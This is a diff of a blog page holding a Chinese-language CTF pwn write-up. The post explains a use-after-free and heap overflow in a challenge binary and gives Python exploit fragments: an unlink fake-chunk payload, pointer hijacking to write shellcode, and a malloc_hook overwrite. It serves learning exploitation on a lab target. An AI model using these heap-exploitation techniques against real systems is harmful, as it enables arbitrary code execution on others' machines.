@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,8 +263,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-AeUjvHUD" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
-
+    <div id="aplayer-LObbzXQh" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 <h2><span id="overview">overview</span></h2><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-01%20%E4%B8%8B%E5%8D%888.39.29.png" alt="截屏2022-04-01 下午8.39.29"></p>
 <p>​        非常之畸形。</p>
 <h2><span id="re">re</span></h2><p>​        逻辑比较简单，结构体中只有一个chunk bp的字段。漏洞点也很魔幻，free只free结构体中保存的指针，而没有free malloc出来的ptr本身，并且没有置0，顺便edit的时候size没有限定，可以造成堆溢出。</p>
@@ -283,26 +282,14 @@
 <p>​        pps：由于我是废物，对于unlink还不是很熟练，所以需要花一些篇章来描述unlink的构造。</p>
 <p>​        草了。我突然意识到unlink构造是可以背板的，无非就是让写fake bk到fake fd指向的地方，然后劫持fake fd对应的指针。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#idx2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#idx3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> <span class="comment">#padding</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>) <span class="comment">#prev_size,size,</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(head + <span class="number">8</span> - <span class="number">0x18</span>)  <span class="comment">#fake chunk fd</span></span><br><span class="line">payload += p64(head + <span class="number">8</span> - <span class="number">0x10</span>)  <span class="comment">#fake chunk bk</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size to bypass the check</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># padding</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment"># Next_chunk&#x27;s prev_size field. Make it believe that prev chunk is free</span></span><br><span class="line">payload += p64(<span class="number">0x110</span>)<span class="comment"># Next_chunk&#x27;s size field</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-
-
-
 <p>​        难绷。</p>
 <h3><span id="劫持ptr为shellcode地址">劫持ptr为shellcode地址</span></h3><p>​        这样我们就劫持了idx1的指针，我们edit chunk的时候实际就是在修改指针使其指向任意地址。（这样看来其实这个部分和wiki上的unlink例题有点像。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload += p64(shellcode_addr)<span class="comment">#chunk[0] to shellcode_addr</span></span><br><span class="line">payload += p64(head + <span class="number">6</span> * <span class="number">8</span>)<span class="comment">#chunk[1] to chunk[5]</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#chunk[2]</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#chunk[3]</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
 <p>这样当我们再次编辑chunk0，就是在shellcode addr上写入数据了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),shellcode)</span><br></pre></td></tr></table></figure>
-
 <h3><span id="劫持main_arena为malloc-hook">劫持main_arena为malloc hook</span></h3><p>​        光写入shellcode不够，我们还需要将<code>malloc_hook</code>的值改为<code>shellcode_addr</code>。</p>
 <p>​        所以我们需要改<code>main_arena</code>为<code>malloc hook</code>，具体原因以及方法之前已经分析过了。在前面的payload中，我们将chunk1的ptr修改为了chunk5的ptr，也就是链表尾部bin的地址，这个尾部bin的fd正好就是指向<code>main_arena</code>的，这样我们就能够单个字节覆盖fd，使其指向<code>malloc hook</code>。最后，我们直接再次edit这个chunk，让它的内容为shellcode地址即可。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">1</span>,<span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">8</span>,p64(shellcode_addr))</span><br></pre></td></tr></table></figure>
-
-
-
 <p>​        下次一定。蚌埠住了。</p>
 <p>​        </p>
 <p>​        </p>
